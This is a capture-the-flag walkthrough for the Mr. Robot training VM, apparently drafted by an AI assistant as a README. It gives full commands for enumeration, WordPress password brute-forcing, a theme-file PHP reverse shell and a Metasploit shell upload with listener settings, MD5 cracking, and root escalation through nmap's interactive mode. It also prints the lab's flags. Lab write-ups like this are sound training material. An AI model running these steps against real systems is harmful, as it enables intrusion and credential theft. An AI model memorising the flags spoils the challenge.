Hereâ€™s the updated version of the report with steps for using `msfconsole` to gain a reverse shell:

---

# Exploitation Walkthrough: Mr. Robot VM

This report details the exploitation process for the **Mr. Robot CTF** virtual machine. The target machine simulates a vulnerable Ubuntu server running WordPress 4.3.1. Below is a step-by-step explanation of the enumeration, exploitation, and privilege escalation processes that led to the full compromise of the system.

---

## Table of Contents

- [Target Information](#target-information)
- [Step 1: Identifying the Target](#step-1-identifying-the-target)
- [Step 2: Initial Scanning](#step-2-initial-scanning)
- [Step 3: WordPress Enumeration](#step-3-wordpress-enumeration)
- [Step 4: Exploiting WordPress](#step-4-exploiting-wordpress)
  - [Manual Reverse Shell](#manual-reverse-shell)
  - [Reverse Shell via Metasploit](#reverse-shell-via-metasploit)
- [Step 5: Privilege Escalation](#step-5-privilege-escalation)
- [Step 6: Final Steps to Root](#step-6-final-steps-to-root)
- [Conclusion](#conclusion)

---

## Target Information

- **Operating System:** Ubuntu 14.04  
- **Application:** WordPress 4.3.1  
- **IP Address:** Dynamic (identified via enumeration)  
- **Objective:** Capture all three keys to complete the challenge.  

---

## Step 1: Identifying the Target

### Retrieving the MAC Address
The MAC address was retrieved from the VM's Bridge Adapter settings in Advanced Mode:
```
XX:XX:XX:XX:XX:XX
```

### Finding the Target's IP Address
Using `arp -a`, we matched the MAC address to its corresponding IP address on the network. Additionally, we performed a subnet scan using Nmap:
```bash
nmap -sn X.X.X.0/24
```
Result:
```
X.X.X.1
X.X.X.112
X.X.X.163
X.X.X.number
```
The target was identified at `X.X.X.number`.  

### Setting the IP as a Variable
To simplify future commands:
```bash
export ip=X.X.X.number
```

---

## Step 2: Initial Scanning

### Nmap Scan
Performed a detailed Nmap scan:
```bash
nmap -A -p- -v $ip
```
Results:
- **Ports Open:** 80 (HTTP), 443 (HTTPS)
- **Server:** Apache HTTPD
- **OS:** Linux 3.x - 4.x  

### Nikto Scan
```bash
nikto -h http://$ip
```
Findings:
- `/wp-login/`: WordPress login page.
- `/#wp-config.php#`: Configuration file (possible credentials).

### Directory Brute Forcing
```bash
dirb http://$ip:80
```
Findings:
- `/fsocity.dic`: A wordlist file.
- `/key-1-of-3.txt`: A file containing the first key:  
  `073403c8a58a1f80d943455fb30724b9`

### Wordlist Processing
We cleaned duplicates in `fsocity.dic`:
```bash
sort -u fsocity.dic -o fsocity_unique.dic
wc -l fsocity_unique.dic
```
Result: **11,451 unique words**

---

## Step 3: WordPress Enumeration

### Enumerating Users
Using WPScan:
```bash
wpscan --url http://$ip --enumerate u
```
Findings:
- **Username:** `Elliot`

### Brute-Forcing the Password
Using the processed wordlist:
```bash
wpscan --url http://$ip --usernames Elliot --passwords fsocity_unique.dic
```
Credentials found:
- **Username:** Elliot  
- **Password:** ER28-0652

---

## Step 4: Exploiting WordPress

### Manual Reverse Shell
- Edited the WordPress theme file (`archive.php`) to include a PHP reverse shell script.
[PentestMonkeyReverseShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- Started a listener on the attacker machine:
  ```bash
  nc -lvnp 4444
  ```
- Successfully gained access to the target shell.

### Reverse Shell via Metasploit
Alternatively, Metasploit's WordPress exploit can be used to gain a reverse shell:
1. Start `msfconsole`:
   ```bash
   msfconsole
   ```

2. Use the `wp_admin_shell_upload` module:
   ```bash
   use exploit/unix/webapp/wp_admin_shell_upload
   ```

3. Set the required options:
   ```bash
   set RHOSTS X.X.X.number
   set TARGETURI /wordpress
   set USERNAME Elliot
   set PASSWORD ER28-0652
   set LHOST X.X.X.your_ip
   set LPORT 4444
   ```

4. Exploit the target:
   ```bash
   exploit
   ```

5. Upon successful exploitation, a reverse shell is opened.

### Stabilizing the Shell
Regardless of the method used, stabilize the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 5: Privilege Escalation

### Cracking the Robot User Hash
Found in `/home/robot`:
- `password.raw-md5`: `robot:c3fcd3d76192e4007dfb496cca67e13b`

Cracked using `hashcat`:
```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot.hashes.txt
hashcat -m 0 -a 0 robot.hashes.txt /usr/share/wordlists/rockyou.txt
```
Result:
- **Password:** `abcdefghijklmnopqrstuvwxyz`

### Switching to Robot User
```bash
su robot
```
Access granted. Retrieved the second key:  
`822c73956184f694993bede3eb39f959`

---

## Step 6: Final Steps to Root

### Exploring the Root Directory
As the `robot` user, access to `/root` was denied.

### Reverting to Elliot User
Switched back to Elliot:
```bash
su Elliot
```

### Exploiting Nmap Interactive Mode
Using the interactive mode in Nmap to traverse the file system:
```bash
nmap --interactive
```
From the interactive shell:
```bash
!sh
cd /root
ls
```
Discovered the final key: `key-3-of-3.txt`  
Content:  
`04787ddef27c3dee1ee161b21670b4e4`

---

## Conclusion

With the discovery of the final key, the **Mr. Robot VM** was fully exploited. This exercise demonstrated the use of enumeration, brute-forcing, privilege escalation, and lateral movement techniques. It also highlighted the flexibility of tools like `msfconsole` and manual approaches for exploitation. The process underscored the importance of securing WordPress installations and mitigating common misconfigurations.

---

**Keys Captured:**
1. `073403c8a58a1f80d943455fb30724b9`
2. `822c73956184f694993bede3eb39f959`
3. `04787ddef27c3dee1ee161b21670b4e4`

---

This concludes the journey of owning the **Mr. Robot VM** and gaining valuable insights into system exploitation.

---

You can now paste this text into a `README.md` file for GitHub. Let me know if you need any further changes!
